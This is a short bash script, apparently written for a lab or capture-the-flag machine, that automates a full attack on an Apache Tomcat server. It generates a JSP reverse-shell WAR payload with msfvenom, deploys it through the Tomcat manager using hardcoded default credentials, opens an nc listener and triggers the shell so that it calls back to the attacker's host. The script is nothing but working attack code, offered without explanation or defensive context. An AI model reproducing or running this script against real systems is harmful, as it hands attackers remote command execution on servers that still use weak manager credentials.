#!/bin/bash

echo "[+] Generating a Reverse Shell"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.14 LPORT=1234 -f war -o revshell.war &>/dev/null
echo "[+] Enabling job control"
set -m &>/dev/null
echo "[+] Uploading the reverse shell file"
curl --upload-file revshell.war -u 'tomcat:s3cret' "http://10.10.10.95:8080/manager/text/deploy?path=/ShellNameHere&update=true" &>/dev/null
echo "[+] Setting up a nc listener"
nc -lvnp 1234 & &>/dev/null
echo "[+] Requesting the reverse shell"
curl "http://10.10.10.95:8080/ShellNameHere" -L &>/dev/null
fg %1